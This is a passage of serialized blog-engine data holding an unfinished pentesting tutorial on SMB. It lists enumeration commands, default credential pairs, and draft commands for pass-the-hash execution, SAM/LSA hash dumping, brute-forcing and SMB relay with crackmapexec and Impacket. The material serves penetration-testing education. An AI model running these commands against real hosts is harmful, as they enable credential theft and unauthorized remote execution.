ws01win10.domain.com\nExecute\ncrackmapexec\ncrackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:\napt-get install crackmapexec\n\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd\ncrackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash\n# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}\n\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute\npsexec/smbexec\n\nBoth options will create a new service (using \\pipe\\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).\nMore info about psexec and smbexec.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./psexec.py [[domain/]username[:password]@]<targetName or address>\n./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\npsexec \\\\192.168.122.66 -u Administrator -p 123456Ww\npsexec \\\\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash\nUsing parameter-k you can authenticate against kerberos instead of NTLM\nwmiexec/dcomexec\nStealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password\n./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nUsing parameter-k you can authenticate against kerberos instead of NTLM\n#If no password is provided, it will be prompted\n./dcomexec.py [[domain/]username[:password]@]<targetName or address>\n./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nAtExec\nExecute commands via the Task Scheduler (using \\pipe\\atsvc via SMB).\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n./atexec.py [[domain/]username[:password]@]<targetName or address> \"command\"\n./atexec.py -hashes <LM:NT> administrator@10.10.10.175 \"whoami\"\nImpacket reference\nhttps://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/\nBruteforce users credentials\nThis is not recommended, you could block an account if you exceed the maximum allowed tries\nnmap --script smb-brute -p 445 <IP>\nridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name\nSMB relay attack\nThis attack uses the Responder toolkit to capture SMB authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.\nMore information about this attack here.\n-->\n\n\n# Blog incomplete, working on it :)\n","slug":"smb-port","published":1,"date":"2022-10-02T19:49:06.080Z","updated":"2022-12-11T04:24:12.168Z","_id":"cl8rrb3he0000e9kccagm0fav","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Have you found that the SMB service is running and you don’t know what to do with it?</p>\n<p>I am going to show you what this service is and how you can exploit it</p>\n<p><img src=\"/images/smbprotocol.png?raw=true\" alt=\"Alt text\" title=\"SMB-Protocol\"></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>First of all, the <strong>Server Message Block</strong> (SMB) is a client-server protocol that regulates access to entire files and directories and other network resources such as:</p>\n<ul>\n<li>Printers</li>\n<li>Routers</li>\n<li>Interfaces released to the network</li>\n</ul>\n<p>The application area is mainly active on <em>Windows</em> operating systems, these network services support SMB with older versions, this means that older windows operating systems are perfectly compatible with newer ones.<br>However, there is a solution that allows the use of SMB on <em><strong>Linux and Unix</strong></em> distributions via Samba.</p>\n<p>The SMB server can provide some parts (if it allows it) of your local files, such as shares.<br>Therefore the part visible to a client is on the one hand independent of the server structure.<br>Access rights are defined by access control lists <em><strong>(ACL)</strong></em>. They can be controlled by attributes such as: </p>\n<ul>\n<li>Execute</li>\n<li>Read</li>\n<li>Full access for individual users or groups of users</li>\n</ul>\n<p><em><strong>ACLs</strong></em> are defined on the basis of shared resources and therefore do not correspond to the rights assigned locally on the server.</p>\n<h1 id=\"First-steps-Enumeration\"><a href=\"#First-steps-Enumeration\" class=\"headerlink\" title=\"First steps: Enumeration\"></a>First steps: Enumeration</h1><p>Scan a network searching for hosts:</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">nbtscan -r 192.168.0.1/24</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"View-the-SMB-server-version\"><a href=\"#View-the-SMB-server-version\" class=\"headerlink\" title=\"View the SMB server version\"></a>View the SMB server version</h1><p>First, to look for possible exploits in SMB it is important to know which version is being used. To do this you can use the MSF auxiliary module: </p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msfconsole</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msf6&gt; use auxiliary/scanner/smb/smb_version</span></span><br></pre></td></tr></table></figure>\n\n<p>Or u can use <strong>this script</strong>:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">#!/bin/sh</span></span><br><span class=\"line\"> <span class=\"comment\">#Author: rewardone</span></span><br><span class=\"line\"> <span class=\"comment\">#Description:</span></span><br><span class=\"line\"> <span class=\"comment\">#Requires root or sufficient permissions to use tcpdump.</span></span><br><span class=\"line\"> <span class=\"comment\"># It will listen for the first 7 packets of a null login</span></span><br><span class=\"line\"> <span class=\"comment\"># and will take the SMB version</span></span><br><span class=\"line\"> <span class=\"comment\">#Notes:</span></span><br><span class=\"line\"> <span class=\"comment\"># Sometimes it will not capture or print multiple # lines.</span></span><br><span class=\"line\"> <span class=\"comment\"># lines. It may be necessary to run a second time to succeed.</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -z <span class=\"variable\">$1</span> ]; <span class=\"keyword\">then</span> <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: ./smbver.sh RHOST &#123;RPORT&#125;&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span>; <span class=\"keyword\">else</span> rhost=<span class=\"variable\">$1</span>; <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ ! -z <span class=\"variable\">$2</span> ]; <span class=\"keyword\">then</span> rport=<span class=\"variable\">$2</span>; <span class=\"keyword\">else</span> rport=139; <span class=\"keyword\">fi</span></span><br><span class=\"line\">tcpdump -s0 -n -i tap0 src <span class=\"variable\">$rhost</span> and port <span class=\"variable\">$rport</span> -A -c 7 2&gt;/dev/null | grep -i <span class=\"string\">&quot;samba|s.a.m&quot;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&#x27;.&#x27;</span> | grep -oP <span class=\"string\">&#x27;UnixSamba.*[0-9a-z]&#x27;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&#x27;&#123;\\n&#x27;</span> &amp; <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;<span class=\"variable\">$rhost</span>: &quot;</span> &amp;</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;exit&quot;</span> | smbclient -L <span class=\"variable\">$rhost</span> 1&gt;/dev/null 2&gt;/dev/null</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;&quot;</span> &amp;&amp; <span class=\"built_in\">sleep</span> .1</span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"SearchSploit\"><a href=\"#SearchSploit\" class=\"headerlink\" title=\"SearchSploit\"></a>SearchSploit</h1><p>To search for possible exploits that are related to SMB protocol you can use this command in msfconsole:</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msfconsole</span></span><br><span class=\"line\"></span><br><span class=\"line\">    Trace program: running</span><br><span class=\"line\"></span><br><span class=\"line\">           wake up, Neo...</span><br><span class=\"line\">        the matrix has you</span><br><span class=\"line\">      follow the white rabbit.</span><br><span class=\"line\"></span><br><span class=\"line\">          knock, knock, Neo.</span><br><span class=\"line\"></span><br><span class=\"line\">                        (`.         ,-,</span><br><span class=\"line\">                        ` `.    ,;&#x27; /</span><br><span class=\"line\">                         `.  ,&#x27;/ .&#x27;</span><br><span class=\"line\">                          `. X /.&#x27;</span><br><span class=\"line\">                .-;--&#x27;&#x27;--.._` ` (</span><br><span class=\"line\">              .&#x27;            /   `</span><br><span class=\"line\">             ,           ` &#x27;   Q &#x27;</span><br><span class=\"line\">             ,         ,   `._    \\</span><br><span class=\"line\">          ,.|         &#x27;     `-.;_&#x27;</span><br><span class=\"line\">          :  . `  ;    `  ` --,.._;</span><br><span class=\"line\">           &#x27; `    ,   )   .&#x27;</span><br><span class=\"line\">              `._ ,  &#x27;   /_</span><br><span class=\"line\">                 ; ,&#x27;&#x27;-,;&#x27; ``-</span><br><span class=\"line\">                  ``-..__``--`</span><br><span class=\"line\"></span><br><span class=\"line\">                             https://metasploit.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msf6&gt; search <span class=\"built_in\">type</span>:exploit platform:windows target:2008 smb</span></span><br><span class=\"line\">searchsploit microsoft smb</span><br></pre></td></tr></table></figure>\n\n<p>Or you can use this command, note that you must have installed searchsploit</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">searchsploit smb</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://www.exploit-db.com/searchsploit\">searchsploit</a></p>\n<h1 id=\"Possible-Credentials\"><a href=\"#Possible-Credentials\" class=\"headerlink\" title=\"Possible Credentials\"></a>Possible Credentials</h1><p>Sometimes companies leave the smb protocol misconfigured, or don’t even configure it at all, and sometimes if they do, they leave very basic credentials, which you can try to use, such as: </p>\n<table>\n<thead>\n<tr>\n<th>Usernames</th>\n<th>Passwords</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>(blank)</td>\n<td>(blank)</td>\n</tr>\n<tr>\n<td>guest</td>\n<td>(blank)</td>\n</tr>\n<tr>\n<td>Administrator, admin</td>\n<td>(blank), password, administrator, admin</td>\n</tr>\n<tr>\n<td>arcserve</td>\n<td>arcserve, backup</td>\n</tr>\n<tr>\n<td>tivoli, tmersrvd</td>\n<td>tivoli, tmersrvd, admin</td>\n</tr>\n<tr>\n<td>backupexec, backup</td>\n<td>backupexec, backup, arcada</td>\n</tr>\n<tr>\n<td>test, lab, demo</td>\n<td>password, test, lab, demo</td>\n</tr>\n</tbody></table>\n<h1 id=\"Some-Commands-to-get-more-information\"><a href=\"#Some-Commands-to-get-more-information\" class=\"headerlink\" title=\"Some Commands to get more information\"></a>Some Commands to get more information</h1><figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Dump interesting information</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">enum4linux -a [-u <span class=\"string\">&quot;&lt;username&gt;&quot;</span> -p <span class=\"string\">&quot;&lt;passwd&gt;&quot;</span>] &lt;IP&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">enum4linux-ng -A [-u <span class=\"string\">&quot;&lt;username&gt;&quot;</span> -p <span class=\"string\">&quot;&lt;passwd&gt;&quot;</span>] &lt;IP&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">nmap --script <span class=\"string\">&quot;safe or smb-enum-*&quot;</span> -p 445 &lt;IP&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Connect to the rpc</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rpcclient -U <span class=\"string\">&quot;&quot;</span> -N &lt;IP&gt; <span class=\"comment\">#No creds</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"comment\">#You can use querydispinfo and enumdomusers to query user information</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Dump user information</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Map possible RPC endpoints</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Enumerating-LSARPC-and-SAMR-rpcclient\"><a href=\"#Enumerating-LSARPC-and-SAMR-rpcclient\" class=\"headerlink\" title=\"Enumerating LSARPC and SAMR rpcclient\"></a>Enumerating LSARPC and SAMR rpcclient</h1><p>Pat of this section was extracted from book “Network Security Assesment 3rd Edition”<br>You can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).</p>\n<h3 id=\"Server-Info\"><a href=\"#Server-Info\" class=\"headerlink\" title=\"Server Info\"></a>Server Info</h3><ul>\n<li>Server Info: <strong>srvinfo</strong></li>\n</ul>\n<h3 id=\"Users-enumeration\"><a href=\"#Users-enumeration\" class=\"headerlink\" title=\"Users enumeration\"></a>Users enumeration</h3><ul>\n<li>List users: <strong>querydispinfo</strong> and <strong>enumdomusers</strong></li>\n<li>Get user details: <strong>queryuser &lt;0xrid&gt;</strong></li>\n<li>Get user groups: <strong>queryusergroups &lt;0xrid&gt;</strong></li>\n<li>GET SID of a user: <strong>lookupnames <username></strong></li>\n<li>Get users aliases: <strong>queryuseraliases [builtin|domain] <sid></strong></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">#Brute-Force users RIDs</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> $(seq <span class=\"number\">500</span> <span class=\"number\">1100</span>); do</span><br><span class=\"line\">    rpcclient -N -U <span class=\"string\">&quot;&quot;</span> <span class=\"number\">10.129</span><span class=\"number\">.14</span><span class=\"number\">.128</span> -c <span class=\"string\">&quot;queryuser 0x$(printf &#x27;%x\\n&#x27; $i)&quot;</span> | grep <span class=\"string\">&quot;User Name\\|user_rid\\|group_rid&quot;</span> &amp;&amp; echo <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<!---\n# You can also use samrdump.py for this purpose\nGroups enumeration\nList groups: enumdomgroups\nGet group details: querygroup <0xrid>\nGet group members: querygroupmem <0xrid>\nAliasgroups enumeration\nList alias: enumalsgroups <builtin|domain>\nGet members: queryaliasmem builtin|domain <0xrid>\nDomains enumeration\nList domains: enumdomains\nGet SID: lsaquery\nDomain info: querydominfo\nShares enumeration\nEnumerate all available shares: netshareenumall\nInfo about a share: netsharegetinfo <share>\nMore SIDs\nFind SIDs by name: lookupnames <username>\nFind more SIDs: lsaenumsid\nRID cycling (check more SIDs): lookupsids <sid>\nExtra commands\n\nTo understand better how the tools samrdump and rpcdump works you should read Pentesting MSRPC.\nGUI connection from linux\nIn the terminal:\nxdg-open smb://cascade.htb/\nIn file browser window (nautilus, thunar, etc)\nsmb://friendzone.htb/general/\nList shared folders\nIt is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.\nsmbclient --no-pass -L //<IP> # Null user\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\nsmbmap -H <IP> [-P <PORT>] #Null user\nsmbmap -u \"username\" -p \"password\" -H <IP> [-P <PORT>] #Creds\nsmbmap -u \"username\" -p \"<NT>:<LM>\" -H <IP> [-P <PORT>] #Pass-the-Hash\ncrackmapexec smb <IP> -u '' -p '' --shares #Null user\ncrackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user\ncrackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user\nConnect/List a shared folder\n#Connect using smbclient\nsmbclient --no-pass //<IP>/<Folder>\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient\n\n#List with smbmap, without folder it list everything\nsmbmap [-u \"username\" -p \"password\"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list\nsmbmap [-u \"username\" -p \"password\"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list\nsmbmap -u \"username\" -p \"<NT>:<LM>\" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash\nManually enumerate windows shares and connect to them\nIt may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.\nCommon share names for windows targets are\nC$\nD$\nADMIN$\nIPC$\nPRINT$\nFAX$\nSYSVOL\nNETLOGON\n(Common share names from Network Security Assessment 3rd edition)\nYou can try to connect to them by using the following command\nsmbclient -U '%' -N \\\\\\\\<IP>\\\\<SHARE> # null session to connect to a windows share\nsmbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)\nor this script (using a null session)\n#/bin/bash\n\nip='<TARGET-IP-HERE>'\nshares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')\n\nfor share in ${shares[*]}; do\n    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '') \n\n    if [[ -z $output ]]; then \n        echo \"[+] creating a null session is possible for $share\" # no output if command goes through, thus assuming that a session was created\n    else\n        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\n    fi\ndone\nexamples\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session\nMount a shared folder\nmount -t cifs //x.x.x.x/share /mnt/share\nmount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share\nDownload files\nRead previous sections to learn how to connect with credentials/Pass-the-Hash.\n#Search a file and download\nsudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap\n#Download all\nsmbclient //<IP>/<share>\n> mask \"\"\n> recurse\n> prompt\n> mget *\n#Download everything to current directory\nCommands:\nmask: specifies the mask which is used to filter the files within the directory (e.g. \"\" for all files)\nrecurse: toggles recursion on (default: off)\nprompt: toggles prompting for filenames off (default: on)\nmget: copies all files matching the mask from host to client machine\n(Information from the manpage of smbclient)\nRead Registry\nYou may be able to read the registry using some discovered credentials. Impacket reg.py allows you to try:\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s\nLocal users\nEnumerate local users with SID brute-forcing:\nWith Impacket:\nlookupsid.py -no-pass hostname.local\nWith Metasploit:\nuse auxiliary/scanner/smb/smb_lookupsid\nset rhosts hostname.local\nrun\nNote: rpcclient command lookupsids only translates a SID to a username but doesn't allow enumeration via brute-forcing.\nPost Exploitation\nThe default config of a Samba server is usually located in /etc/samba/smb.conf and might have some dangerous configs:\n\nThe command smbstatus gives information about the server and about who is connected.\nAuthenticate using Kerberos\nYou can authenticate to kerberos using the tools smbclient and rpcclient:\nsmbclient --kerberos //ws01win10.domain.com/C$\nrpcclient -k ws01win10.domain.com\nExecute\ncrackmapexec\ncrackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:\napt-get install crackmapexec\n\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd\ncrackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash\n# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}\n\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute\npsexec/smbexec\n\nBoth options will create a new service (using \\pipe\\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).\nMore info about psexec and smbexec.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./psexec.py [[domain/]username[:password]@]<targetName or address>\n./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\npsexec \\\\192.168.122.66 -u Administrator -p 123456Ww\npsexec \\\\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash\nUsing parameter-k you can authenticate against kerberos instead of NTLM\nwmiexec/dcomexec\nStealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password\n./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nUsing parameter-k you can authenticate against kerberos instead of NTLM\n#If no password is provided, it will be prompted\n./dcomexec.py [[domain/]username[:password]@]<targetName or address>\n./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nAtExec\nExecute commands via the Task Scheduler (using \\pipe\\atsvc via SMB).\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n./atexec.py [[domain/]username[:password]@]<targetName or address> \"command\"\n./atexec.py -hashes <LM:NT> administrator@10.10.10.175 \"whoami\"\nImpacket reference\nhttps://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/\nBruteforce users credentials\nThis is not recommended, you could block an account if you exceed the maximum allowed tries\nnmap --script smb-brute -p 445 <IP>\nridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name\nSMB relay attack\nThis attack uses the Responder toolkit to capture SMB authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.\nMore information about this attack here.\n-->\n\n\n<h1 id=\"Blog-incomplete-working-on-it\"><a href=\"#Blog-incomplete-working-on-it\" class=\"headerlink\" title=\"Blog incomplete, working on it :)\"></a>Blog incomplete, working on it :)</h1>","site":{"data":{}},"excerpt":"<p>Have you found that the SMB service is running and you don’t know what to do with it?</p>\n<p>I am going to show you what this service is and how you can exploit it</p>\n<p><img src=\"/images/smbprotocol.png?raw=true\" alt=\"Alt text\" title=\"SMB-Protocol\"></p>","more":"<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>First of all, the <strong>Server Message Block</strong> (SMB) is a client-server protocol that regulates access to entire files and directories and other 